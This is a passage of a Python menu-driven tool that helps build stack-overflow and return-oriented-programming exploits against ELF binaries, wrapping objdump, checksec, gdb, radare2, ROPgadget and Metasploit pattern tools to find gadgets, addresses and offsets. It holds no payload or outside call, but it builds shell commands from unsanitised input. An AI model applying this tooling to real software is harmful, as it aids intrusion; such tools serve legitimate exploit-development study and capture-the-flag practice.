IND = spacePadding(IND, COL1)
ARC = spacePadding(ARC, COL1)
SRT = spacePadding(SRT, COL1)
MAN = spacePadding(MAN, COL1)
JMP = spacePadding(JMP, COL1)
CUS = spacePadding(CUS, COL1)

command("sleep 5s")
   
# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub                                                               
# Version : FULL STACK
# Details : Start the main menu controller.
# Modified: N/A                                                               	
# -------------------------------------------------------------------------------------

while True: 
   saveParams()
   clearClutter()
   checkParams = 0							# RESET'S VALUE
   command("clear")							# CLEARS SCREEN
   dispMenu()								# DISPLAY UPPER
   options()								# DISPLAY LOWER
   selection=input("[?] Please select an option: ")			# SELECT CHOICE

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : FULL STACK
# Details : Menu option selected - Secret option that will run all commands.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='0':
      pass
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : FULL STACK
# Details : Menu option selected - Set start address.
# Modified: N/A
# -------------------------------------------------------------------------------------      
      
   if selection =='1':
      BAK = SRT
      SRT = input("[?] Please enter start address: ")
      if SRT != "":
         SRT = spacePadding(SRT,COL1)
      else:
            SRT = BAK
      prompt()  
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : FULL STACK
# Details : Menu option selected - Set main address.
# Modified: N/A
# -------------------------------------------------------------------------------------      
      
   if selection =='2':
      BAK = MAN
      MAN = input("[?] Please enter main address: ")
      if MAN != "":
         MAN = spacePadding(MAN,COL1)
      else:
            MAN = BAK
      prompt()   
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : FULL STACK
# Details : Menu option selected - Set system address.
# Modified: N/A
# -------------------------------------------------------------------------------------      
      
   if selection =='3':
      BAK = RCX
      RCX = input("[?] Please enter system address: ")
      if RCX != "":
         RCX = spacePadding(RCX,COL1)
      else:
            RCX = BAK
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : FULL STACK
# Details : Menu option selected - Set jump address.
# Modified: N/A
# -------------------------------------------------------------------------------------      
      
   if selection =='4':
      BAK = JMP
      JMP = input("[?] Please enter jump address: ")
      if JMP != "":
         JMP = spacePadding(JMP,COL1)
      else:
            JMP = BAK
      prompt()
           
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : FULL STACK
# Details : Menu option selected - Set test address.
# Modified: N/A
# -------------------------------------------------------------------------------------      
      
   if selection =='5':
      BAK = CUS
      CUS = input("[?] Please enter test address: ")
      if CUS != "":
         CUS = spacePadding(CUS,COL1)
      else:
            CUS = BAK
      prompt() 
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : FULL STACK
# Details : Menu option selected - Set pop RDI address.
# Modified: N/A
# -------------------------------------------------------------------------------------      
      
   if selection =='6':
      BAK = RDI
      RDI = input("[?] Please enter pop RDI address: ")
      if RDI != "":
         RDI = spacePadding(RDI,COL1)
      else:
            RDI = BAK
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : FULL STACK
# Details : Menu option selected - Set unallocated.
# Modified: N/A
# -------------------------------------------------------------------------------------      
      
   if selection =='7':
      BAK = RAX
      RAX = input("[?] Please enter UNALLOCATED address: ")
      if RAX != "":
         RAX = spacePadding(RAX,COL1)
      else:
            RAX = BAK
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : FULL STACK
# Details : Menu option selected - Set unallocated.
# Modified: N/A
# -------------------------------------------------------------------------------------      
      
   if selection =='8':
      BAK = RBX
      RBX = input("[?] Please enter UNALLOCATED address: ")
      if RBX != "":
         RBX = spacePadding(RBX,COL1)
      else:
            RBX = BAK
      prompt()     
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : FULL STACK
# Details : Menu option selected - Set unallocated.
# Modified: N/A
# -------------------------------------------------------------------------------------      
      
   if selection =='9':
      BAK = RDX
      RDX = input("[?] Please enter UNALLOCATED address: ")
      if RDX != "":
         RDX = spacePadding(RDX,COL1)
      else:
            RDX = BAK
      prompt() 
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : FULL STACK
# Details : Menu option selected - Set RSP value.
# Modified: N/A
# -------------------------------------------------------------------------------------      
      
   if selection =='10':
      BAK = RSP
      RSP = input("[?] Please enter stack pointer address: ")
      if RSP != "":
         RSP = spacePadding(RSP,COL1)
      else:
            RSP = BAK
      prompt()      
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : FULL STACK
# Details : Menu option selected - Set RBP value.
# Modified: N/A
# -------------------------------------------------------------------------------------      
      
   if selection =='11':
      BAK = RBP
      RBP = input("[?] Please enter base pointer address: ")
      if RBP != "":
         RBP = spacePadding(RBP,COL1)
      else:
            RBP = BAK
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : FULL STACK
# Details : Menu option selected - Set RIP Value.
# Modified: N/A
# -------------------------------------------------------------------------------------      
      
   if selection =='12':
      BAK = RIP
      RIP = input("[?] Please enter instruction pointer address: ")
      if RIP != "":
         RIP = spacePadding(RIP,COL1)
      else:
            RIP = BAK
      prompt()   
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : FULL STACK
# Details : Menu option selected - Set custom address.
# Modified: N/A
# -------------------------------------------------------------------------------------      
      
   if selection =='13':
      BAK = RSI
      RSI = input("[?] Please enter custon address: ")
      if RSI != "":
         RSI = spacePadding(RSI,COL1)
      else:
            RSI = BAK
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : FULL STACK
# Details : Menu option selected - Set file name.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '14':
      print(colored("[*] Scanning files in " + localDir + " directory...", colour3))
      command("ls -la " + localDir + " > dir.tmp")
      for loop in range(3):
         command("sed -i '1d' dir.tmp")
      command("sed -i '/RA.db/d' dir.tmp")
      count = lineCount("dir.tmp")        
      if count < 1:
         print("[-] The directory is empty...")
      else:
         catsFile("dir.tmp")
         BAK = FIL
         FIL = input("[?] Please enter filename: ")
         if FIL != "":
            if os.path.exists(localDir + "/" + FIL.rstrip(" ")):
               command("chmod -x " + localDir + "/" + FIL.rstrip(" "))
               FIL = spacePadding(FIL,COL3)
               MODE = spacePadding("Static", COL1)
            else:
               print("[-] I could not find the file name you entered, did you spell it correctly?...")
               FIL = BAK
         else:
            FIL = BAK
      prompt() 
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : FULL STACK
# Details : Menu option selected - Switch modes.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='15':
      if FIL[:7].upper() == "UNKNOWN":
         print("[-] Filename not specified...")
      else:
         if MODE[:6] == "Static":
            command("chmod +x " + localDir + "/" + FIL.rstrip(" "))
            MODE = spacePadding("Dynamic", COL1)
         else:
            command("chmod -x " + localDir + "/" + FIL.rstrip(" "))
            MODE = spacePadding("Static", COL1)
      print(colored("[*] File mode switched to " + MODE.rstrip(" ") + "...", colour3))
      prompt()                              

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : FULL STACK
# Details : Menu option selected - Gather data from file name.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='16':
      if FIL[:7].upper() == "UNKNOWN":
         print("[-] Filename not specified...")
      else:
         command("objdump -D " + localDir + "/" + FIL.rstrip(" ") + " > systems.tmp")
         command("cat systems.tmp | grep system > system.tmp")
         count = lineCount("system.tmp")
         if count > 1:
            cutLine(">:","system.tmp")
         system = linecache.getline("system.tmp",1).split(":")[0]
         system = system.strip(" ")
         if (system[:2] != "0x") and (len(system) == 6):
            system = "0x0000000000" + system            
         RCX = spacePadding(system, COL1)
         command("file " + localDir + "/" + FIL.rstrip(" ") + " > file.tmp")
         command("objdump" + " -f " + localDir + "/" + FIL.rstrip(" ") + " > headers.tmp")
         cutLine(localDir, "headers.tmp")       
         command("cat file.tmp > combined.tmp")
         command("cat headers.tmp >> combined.tmp")         
         parsFile("combined.tmp")
         catsFile("combined.tmp")         
         with open("combined.tmp") as read:
            for binary in read:
               if "ELF" in binary:
                  COM = spacePadding("ELF", COL1)
                  print("Linux binary file...")         
               if "8-bit" in binary:
                  BITS = "08-Bit"
                  print(BITS + " architecture...")           
                  BITS = spacePadding(BITS, COL1)            
               if "16-bit" in binary:
                  BITS = "16-Bit"
                  print(BITS + " architecture...")           
                  BITS = spacePadding(BITS, COL1)            
               if "32-bit" in binary:
                  BITS = "32-Bit"
                  print(BITS + " architecture...")           
                  BITS = spacePadding(BITS, COL1)         
               if "64-bit" in binary:
                  BITS = "64-Bit"
                  print(BITS + " architecture...")  
                  BITS = spacePadding(BITS, COL1)         
               if "LSB" in binary:
                  IND = "little"
                  print(IND + " indian format...")
                  IND = spacePadding(IND, COL1)
               if "MSB" in binary:
                  IND = "big"
                  print(IND + " indian...")
                  IND = spacePadding(IND, COL1)            
               if "dynamically linked" in binary:
                  command("ldd " + localDir + "/" + FIL.rstrip(" ") + " > libc.tmp")
                  command("cat libc.tmp | grep '=>' > address.tmp")
                  with open("address.tmp","r") as address:
                     LIBC = spacePadding(address.readline().split(" ")[2], COL2) 
                     print("Dynamic link to " + LIBC.rstrip(" ") + "...")               
               if "not stripped" in binary:
                  print("Debugging information built in...")
               else:
                  if "stripped" in binary:
                     print("Debugging information removed...")
               if "intel" in binary:
                  print("Consider switching the disassembly style to intel - 'set disassembly-flavor intel'...")
               if "aarch64" in binary:
                  ARC = spacePadding("aarch64", COL1)
               if "alpha" in binary:
                  ARC = spacePadding("alpha", COL1)
               if "amd64" in binary:
                  ARC = spacePadding("amd64", COL1)
               if "arm" in binary:
                  ARC = spacePadding("arm", COL1)
               if "avr" in binary:
                  ARC = spacePadding("avr", COL1)
               if "cris" in binary:
                  ARC = spacePadding("cris", COL1)
               if "i386" in binary:
                  ARC = spacePadding("i386", COL1)
               if "ia64" in binary:
                  ARC = spacePadding("ia64", COL1)
               if "m68k" in binary:
                  ARC = spacePadding("m68k", COL1)
               if "mips" in binary:
                  ARC = spacePadding("mips", COL1)
               if "mips64" in binary:
                  ARC = spacePadding("mips64", COL1)
               if "mips430" in binary:
                  ARC = spacePadding("mips430", COL1)
               if "powerpc" in binary:
                  ARC = spacePadding("powerpc", COL1)
               if "powerpc64" in binary:
                  ARC = spacePadding("powerpc64", COL1)
               if "s390" in binary:
                  ARC = spacePadding("s390", COL1)
               if "sparc" in binary:
                  ARC = spacePadding("sparc", COL1)
               if "sparc64" in binary:
                  ARC = spacePadding("sparc64", COL1)
               if "thumb" in binary:
                  ARC = spacePadding("thumb", COL1)
               if "vax" in binary:
                  ARC = spacePadding("vax", COL1)
               if "elf" in binary:
                  COM = spacePadding("ELF", COL1)
               if SRT[:18] == "0x0000000000000000":          
                  command("cat headers.tmp | grep 'start' > start.tmp ")
                  with open("start.tmp","r") as start :
                     for line in start:
                        checksum, null, address = line.split(" ")
                        if checksum[:5] == "start":
                           SRT = spacePadding(address, COL1)
      prompt()            

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                           
# CONTRACT: GitHub
# Version : FULL STACK
# Details : Menu option selected - Checksec file name.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '17':
      if FIL[:7].upper() == "UNKNOWN":
         print("[-] Filename not specified...")
      else:
         print(colored("[*] Examining filename " + localDir + "/" + FIL.rstrip(" ") + "...", colour3))
         command("checksec " + localDir + "/" + FIL.rstrip(" ") + " 2> checksec.tmp")
         parsFile("checksec.tmp")
         catsFile("checksec.tmp")         
         print("If RELRO is set to full, then the entire GOT is read-only which removes the ability to perform a 'GOT overwrite' attack...")
         print("If CANARY is found, then the program checks to see if the stack has been smashed...")
         print("If FORTIFY is enabled, then the program checks for buffer overflow...")
         print("If NX is enabled, then the stack is read-only and you will need to use return-oriented programming.")
         print("If PIE is enabled, then the programs memory locations will not stay the same hence you need to leak addresses to find offsets...")
         print("If RWX has segments, then these are writeable and executable at the same time...")         
         count = lineCount("checksec.tmp") 
         for x in range(0, count):
            binary = linecache.getline("checksec.tmp", x+1)
            if "No RELRO" in binary:
               RE = "RELRO    None     "               
            if "Full RELRO" in binary:
               RE = "RELRO    Full     " 
            if "Partial RELRO" in binary:
               RE = "RELRO    Partial  "               
            if "No canary found" in binary:
               ST = "STACK    No Canary"  
            if "Canary found" in binary:
               ST = "STACK    Canary   "
            if "No Fortify" in binary:
               FO = "Fortify  Disabled "                              
            if "NX disabled" in binary:
               NX = "NX       Disabled "
            if "NX enabled" in binary:
               NX = "NX       Enabled  "                           
            if "No PIE" in binary:
               PI = "PIE      No PIE   "               
            if "PIE enabled" in binary:
               PI = "PIE      Enabled  "                       
            if "No RWX segments" in binary:
               RW = "RWX     NoSegments"
            if "Has RWX segments" in binary:
               RW = "RWX      Segments "
      prompt()
                  
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : FULL STACK
# Details : Menu option selected - Create functions file.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '18':
      if FIL[:7].upper() == "UNKNOWN":
         print("[-] Filename not specified...")
      else:         
         print(colored("[*] Examining filename " + localDir + "/" + FIL.rstrip(" ") + "...", colour3))
         command("gdb -batch -ex 'file " + localDir + "/" + FIL.rstrip(" ") + "' -ex 'info functions' > functions.tmp")
         parsFile("functions.tmp")
         catsFile("functions.tmp")        
         command("sed -i '/0x/!d' functions.tmp")         
         funcNum = lineCount("functions.tmp")
         funcNum = spacePadding(str(funcNum),7)
         command("cp functions.tmp " + localDir + "/functions.txt")         
         command("awk '/ _init/' functions.tmp > altered.tmp")
         cutLine("init","functions.tmp")
         command("awk '/ _start/' functions.tmp >> altered.tmp")         
         cutLine("start","functions.tmp")         
         command("awk '/main/' functions.tmp >> altered.tmp")
         cutLine("main","functions.tmp")
         command("awk '/ _fini/' functions.tmp >> altered.tmp")                  
         cutLine("fini","functions.tmp")
         command("echo '- - - - - - - - - - - - - - - - - - - - - - - -' >> altered.tmp")
         command("cat functions.tmp >> altered.tmp")
         command("rm functions.tmp")
         command("mv altered.tmp functions.tmp")   
         check = linecache.getline("functions.tmp", 1)
         if check[:1] == "-":
            cutLine("- - - - - -", "functions.tmp")
         with open("functions.tmp", "r") as functions:
            for x in range(0, maxDispl):
               FUNC[x] = functions.readline().rstrip(" ")
               FUNC[x] = spacePadding(FUNC[x], COL2)                         
         if SRT[:18] == "0x0000000000000000":          
            command("cat functions.tmp | grep '_start' > start.tmp ")
            with open("start.tmp","r") as start :
               for line in start:
                  address, checksum = line.split("  ")
                  if checksum[:6] == "_start":
                     SRT = spacePadding(address, COL1)                     
         if MAN[:18] == "0x0000000000000000":
            command("cat functions.tmp | grep 'main' > main.tmp ")
            with open("main.tmp","r") as main:
               for line in main:
                  address, checksum = line.split("  ")
                  if checksum[:4] == "main":
                     MAN = spacePadding(address, COL1)                          
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : FULL STACK
# Details : Menu option selected - Use radare script.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '19':
      if FIL[:7].upper() == "UNKNOWN":
         print("[-] Filename not specified...")
      else:
         r = r2pipe.open(localDir + "/" + FIL.rstrip(" "))
         print(r.cmd('aa'),file=open('output.tmp', 'a'))
         print(r.cmd('afl'),file=open('output.tmp', 'a'))
         print(r.cmd('s start'),file=open('output.tmp', 'a'))
         print( r.cmd('pdf'),file=open('output.tmp', 'a'))
         print(r.cmd('s main'),file=open('output.tmp', 'a'))
         print( r.cmd('pdf'),file=open('output.tmp', 'a'))
         parsFile("output.tmp")
         catsFile("output.tmp")                     
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : FULL STACK
# Details : Menu option selected - Create gadgets file.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '20':
      if FIL[:7].upper() == "UNKNOWN":
         print("[-] Filename not specified...")
      else:      
         print(colored("[*] Examining file " + localDir + "/" + FIL.rstrip(" ") + "...", colour3))
         command("ROPgadget --binary " + localDir + "/" + FIL.rstrip(" ") + " > gadgets.tmp")
         parsFile("gadgets.tmp")
         catsFile("gadgets.tmp")        
         for i in range(2):
            command("sed -i '1d' gadgets.tmp")
         command("sed -i 's/://g' gadgets.tmp")
         cutLine("Unique gadgets","gadgets.tmp")
         gadgNum = lineCount("gadgets.tmp")
         gadgNum = spacePadding(str(gadgNum),7)         
         command("cat gadgets.tmp | grep 'pop rdi ; ret' > pop.tmp")
         counter = lineCount("pop.tmp")
         if counter > 0:
            command("cat pop.tmp > full.tmp")
            command("echo '- - - - - - - - - - - - - - - - - - - - - - - - - - - - ' >> full.tmp")
            command("cat gadgets.tmp >> full.tmp")             
         check = linecache.getline("full.tmp", 1)
         if check[:1] == "-":
            cutLine("- - - - - -", "full.tmp")         
         with open("full.tmp","r") as gadgets:
            for x in range (0, maxDispl):
               GADD[x] = gadgets.readline().rstrip(" ")
               GADD[x] = spacePadding(GADD[x], COL3)
               if x == 0:
                  RDI = GADD[x].split(" ")[0].rstrip(" ")
         command("mv gadgets.tmp " + localDir + "/gadgets.txt")
      prompt()
   
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : FULL STACK
# Details : Menu option selected - Display object headers.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '21':
      if FIL[:7].upper() == "UNKNOWN":
         print("[-] Filename not specified...")
      else:
         print(colored("[*] Examining file " + localDir + "/" + FIL.rstrip(" ") + "...", colour3))
         command("objdump" + " -p " + localDir + "/" + FIL.rstrip(" ") + " > objects.tmp")
         catsFile("objects.tmp")
      prompt() 
   
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : FULL STACK
# Details : Menu option selected - Display section headers.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '22':
      if FIL[:7].upper() == "UNKNOWN":
         print("[-] Filename not specified...")
      else:
         print(colored("[*] Examining file " + localDir + "/" + FIL.rstrip(" ") + "...", colour3))
         command("objdump" + " -h " + localDir + "/" + FIL.rstrip(" ") + " > sections.tmp")
         parsFile("sections.tmp")
         catsFile("sections.tmp")
      prompt() 
   
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : FULL STACK
# Details : Menu option selected - Display all Headers.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '23':
      if FIL[:7].upper() == "UNKNOWN":
         print("[-] Filename not specified...")
      else:
         print(colored("[*] Examining file " + localDir + "/" + FIL.rstrip(" ") + "...", colour3))
         command("objdump" + " -x " + localDir + "/" + FIL.rstrip(" ") + "> all.tmp")
         parsFile("all.tmp")
         catsFile("all.tmp")
      prompt() 
   
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : FULL STACK
# Details : Menu option selected - Display executable section
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '24':
      if FIL[:7].upper() == "UNKNOWN":
         print("[-] Filename not specified...")
      else:
         print(colored("[*] Examining file " + localDir + "/" + FIL.rstrip(" ") + "...", colour3))
         command("objdump" + " -d " + localDir + "/" + FIL.rstrip(" ") + " > exec.tmp")
         parsFile("exec.tmp")
         catsFile("exec.tmp")
      prompt() 
   
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : FULL STACK
# Details : Menu option selected - Display debug information.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '25':
      if FIL[:7].upper() == "UNKNOWN":
         print("[-] Filename not specified...")
      else:
         print(colored("[*] Examining file " + localDir + "/" + FIL.rstrip(" ") + "...", colour3))
         command("objdump" + " -g " + localDir + "/" + FIL.rstrip(" ") + " > debug.tmp")
         parsFile("debug.tmp")
         catsFile("debug.tmp")
      prompt() 
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : FULL STACK
# Details : Menu option selected - Display debug + code intermix.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '26':
      if FIL[:7].upper() == "UNKNOWN":
         print("[-] Filename not specified...")
      else:
         print(colored("[*] Examining file " + localDir + "/" + FIL.rstrip(" ") + "...", colour3))
         command("objdump" + " -D -S " + localDir + "/" + FIL.rstrip(" ") + " > code.tmp")
         parsFile("code.tmp")
         catsFile("code.tmp")
         
      prompt() 
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : FULL STACK
# Details : Menu option selected - Display symbols
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '27':
      if FIL[:7].upper() == "UNKNOWN":
         print("[-] Filename not specified...")
      else:
         print(colored("[*] Examining file " + localDir + "/" + FIL.rstrip(" ") + "...", colour3))
         command("objdump" + " -t " + localDir + "/" + FIL.rstrip(" ") + " > symbols.tmp")
         parsFile("symbols.tmp")
         catsFile("symbols.tmp")
      prompt() 
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : FULL STACK
# Details : Menu option selected - Display stabs.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '28':
      if FIL[:7].upper() == "UNKNOWN":
         print("[-] Filename not specified...")
      else:
         print(colored("[*] Examining file " + localDir + "/" + FIL.rstrip(" ") + "...", colour3))
         command("objdump" + " -G " + localDir + "/" + FIL.rstrip(" ") + " > stabs.tmp")
         parsFile("stabs.tmp")
         catsFile("stabs.tmp")
      prompt() 
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : FULL STACK
# Details : Menu option selected - Display in hex form.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '29':
      if FIL[:7].upper() == "UNKNOWN":
         print("[-] Filename not specified...")
      else:
         print(colored("[*] Examining file " + localDir + "/" + FIL.rstrip(" ") + "...", colour3))
         command("objdump" + " -s " + localDir + "/" + FIL.rstrip(" ") + " > hex.tmp")
         parsFile("hex.tmp")
         catsFile("hex.tmp")
      prompt() 
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : FULL STACK
# Details : Menu option selected - Hex Editor.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '30':
      if FIL[:7].upper() == "UNKNOWN":
         print("[-] Filename not specified...")
      else:
         print(colored("[*] Editing filename " + localDir + "/" + FIL.rstrip(" ") + "...", colour3))
         command("ghex " + localDir + "/" + FIL.rstrip(" "))
      prompt() 
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : FULL STACK
# Details : Menu option selected - MSF pattern create.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '31':
      if FIL[:7].upper() == "UNKNOWN":
         print("[-] Filename not specified...")
      else:
         LEN1 = input("[?] Please input lenght of pattern: ")
         if LEN1.isdigit():
            print(colored("[*] Creating unique pattern...", colour3))          
            command("msf-pattern_create -l " + LEN1 + " > pattern.tmp")
            catsFile("pattern.tmp")
         else:
            print("[-] Invalid value...")
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : FULL STACK
# Details : Menu option selected - Run file name.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='32':
      if FIL[:7].upper() == "UNKNOWN":
         print("[-] Filename not specified...")
      else:
         print(colored("[*] Running filename " + localDir + "/" + FIL.rstrip(" ") + "...\n", colour3))
         command(localDir + "/" + FIL.rstrip(" "))
      prompt()   
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                           
# CONTRACT: GitHub
# Version : FULL STACK
# Details : Menu option selected - Run file name using ltrace.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '33':
      if FIL[:7].upper() == "UNKNOWN":
         print("[-] Filename not specified...")
      else:
         print(colored("[*] Running filename " + localDir + "/" + FIL.rstrip(" ") + "...\n", colour3))
         command("ltrace ./" + localDir + "/" + FIL.rstrip(" "))
      prompt()    
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : FULL STACK
# Details : Menu option selected - gdb file name.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '34':
      if FIL[:7].upper() == "UNKNOWN":
         print("[-] Filename not specified...")
      else:
         print(colored("[*] Editing filename " + localDir + "/" + FIL.rstrip(" ") + "...", colour3))
         command("echo 'set disassembly-flavor " + flavour.rstrip(" ") + "' > command.tmp")
         command("echo 'set follow-fork-mode child' >> command.tmp")
         command("gdb -q " + localDir + "/" + FIL.rstrip(" ") + " -x command.tmp")
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : FULL STACK
# Details : Menu option selected - MSF patter finder.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '35':
      if FIL[:7].upper() == "UNKNOWN":
         print("[-] Filename not specified...")
      else:
         print(colored("[*] Finding buffer offset...", colour3))
         offset = input("[?] Please enter segmentation fault value: ")
         if offset != "":
            command("msf-pattern_offset -l " + LEN1 + " -q " + offset + " > offset.tmp")
            catsFile("offset.tmp")
            OFF = linecache.getline("offset.tmp", 1).rstrip("\n").split(" ")[-1]
            OFF = spacePadding(OFF, COL1)
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : FULL STACK
# Details : Menu option selected - Set OFFSET value.
# Modified: N/A
# -------------------------------------------------------------------------------------      
      
   if selection =='36':
      BAK = OFF
      OFF = input("[?] Please enter offset value: ")
      if OFF != "":
         OFF = OFF + " Bytes"
         OFF = spacePadding(OFF,COL1)
      else:
            OFF = BAK
      prompt() 
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : FULL STACK
# Details : Menu option selected - Adjust Offset.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '37':
      if FIL[:7].upper() == "UNKNOWN":
         print("[-] Filename not specified...")
      else:
         BAK = OFF2
         OFF2 = input("[?] Please enter offset value: ")
         if OFF2 != "":
            OFF2 = OFF2 + " Bytes"
            OFF2 = spacePadding(OFF2,COL1)
         else:
            OFF2 = BAK
      prompt() 
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : FULL STACK
# Details : Menu option selected - Disassemble MAN.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '38':
      command("echo 'set disassembly-flavor " + flavour.rstrip(" ") + "' > command.tmp")
      command("echo 'set follow-fork-mode child' >> command.tmp")
      command("echo 'break main' >> command.tmp")
      command("echo 'run' >> command.tmp")
      command("echo 'disassemble' >> command.tmp")
      command("echo 'quit' >> command.tmp")
      command("gdb " + localDir + "/" + FIL.rstrip(" ") +" -x command.tmp")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : FULL STACK
# Details : Menu option selected - Disassemble function.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '39':
      function = input("[?] Please enter function name: ")
      command("echo 'set disassembly-flavor " + flavour.rstrip(" ") + "' > command.tmp")
      command("echo 'set follow-fork-mode child' >> command.tmp")      
      command("echo 'break main' >> command.tmp")
      command("echo 'run' >> command.tmp")
      command("echo 'disassemble /m " + function.rstrip(" ") + "' >> command.tmp")
      command("echo 'quit' >> command.tmp")
      command("gdb " + localDir + "/" + FIL.rstrip(" ") +" -x command.tmp")
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : FULL STACK
# Details : Menu option selected - Disassemble address.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '40':
      address = input("[?] Please enter address value: ")
      if address != "":
         command("echo 'set disassembly-flavor " + flavour.rstrip(" ") + "' > command.tmp")
         command("echo 'set follow-fork-mode child' >> command.tmp")      
         command("echo 'break main' >> command.tmp")
         command("echo 'run' >> command.tmp")
         command("echo 'quit' >> command.tmp")
         command("echo 'disassemble " + address.rstrip(" ") + "' >> command.tmp")
         command("gdb " + localDir + "/" + FIL.rstrip(" ") +" -x command.tmp")
      prompt() 
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : FULL STACK
# Details : Menu option selected - Blank.
# Modified: N/A
# -------------------------------------------------------------------------------------

